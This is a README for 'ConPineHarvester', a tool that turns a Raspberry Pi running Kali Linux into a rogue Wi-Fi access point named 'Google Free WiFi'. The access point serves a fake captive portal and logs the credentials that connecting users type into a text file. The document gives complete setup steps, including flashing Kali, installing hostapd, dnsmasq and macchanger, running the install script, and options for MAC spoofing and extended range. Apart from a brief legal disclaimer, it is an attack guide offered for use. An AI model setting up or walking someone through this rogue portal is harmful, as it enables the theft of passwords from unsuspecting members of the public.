# Con_Pi_neHarvester

# A fake credential harvesting rogue captive portal for Raspberry Pi ZeroW / 3 / 3 B+ using Kali Linux

I do NOT take any responsibility for your actions while using any material provided from this repository.
Performing attacks on public users is illegal and should require permission from all users within the radius of the network.

To donate, please send me Ethereum :)
Address:
0xD3e5a9d8f07040163e3b6c1949573350412A5d2E

Software:
Balena Etcher: 
https://www.balena.io/etcher/

Kali Linux 2019.3 for Raspberry Pi 3,3+:
https://images.offensive-security.com/arm-images/kali-linux-2019.3-rpi3-nexmon-64.img.xz



Fresh install of Kali Linux ARM 64-bit:
Flash the Kali Image to the Pi using Etcher OR follow the steps below if you are using a linux OS to image the SD Card:

```
#Download the image
wget https://images.offensive-security.com/arm-images/kali-linux-2019.3-rpi3-nexmon-64.img.xz

#Extract
unxz kali-linux-2019.2a-rpi3-nexmon-64.img.xz

#Find the SD Card device name
sudo fdisk -l
#In my case it was /dev/mmcblk1

#Flash the image to the SD
sudo dd if=/home/PROFILE NAME/kali-linux-2019.2a-rpi3-nexmon-64.img of=/dev/mmcblk1 status=progress bs=4M

```


Insert the SD Card into the Pi and ssh to the new system with the following details:

```
username: root
password: toor
```

Please ensure you regenerate the SSH keys and update the password, otherwise you will be hacked.

```
cd /etc/ssh/
mkdir default_kali_keys
mv ssh_host_* default_kali_keys/

dpkg-reconfigure openssh-server
passwd
exit

```
To reconnect, you'll need to clear the key from your system. on linux and macOS it'll usually give you a command to run e.g:
```
ssh-keygen -f "/home/username/.ssh/known_hosts" -R "IP/Hostname of Pi"
```
This is performed differently on each system.

Once you've done this, reconnect using your new password, install dependencies and run the install script:


```
sudo apt-get update
sudo apt-get install -y git php dnsmasq dnsmasq-base macchanger hostapd
git clone https://github.com/NickJongens/ConPineHarvester
cd ConPineHarvester
chmod +x install.sh
sudo ./install.sh
sudo reboot
```
During installation, macchanger may ask whether or not MAC addresses should be changed automatically - choose "No". The startup script will perform this task more reliably.

After the reboot, look for an access point named "Google Free WiFi." 

Connecting to it from an Apple, Android or Windows device should automatically bring up a captive portal login screen.
The Windows captive portal is a bit harder to introduce properly. (BETA)
It requires a folder called 'redirect' with it's own 'index.html' file redirecting to the root website index.html

Credentials are logged in `/var/www/html/usernames.txt`.
Website data will be able to be modified under `/var/www/html`

To use an external WiFi Adapter for better range, please change the
'wlan0' value in the following files:

```
hostapd.conf
ConPineHarvesterStart.sh 
```

To:

Your WiFi adapter interface name e.g 'wlan1' without quotes before running the install script.

I do NOT take any responsibility for your actions while using any material provided from this repository.
Performing attacks on public users is illegal and should require permission from all users within the radius of the network.

Background:

Based on the following project: https://github.com/braindead-sec/rogue-captive 
Braindead-Sec's version was hard to get working on the latest raspbian, so I thought I'd modify and release it for Kali.
Unfortunately, Kali doesn't use rc.local so this is using a cron job to run the script on startup. There are a few improvements including support for Windows 10 and also a newer PHP version.
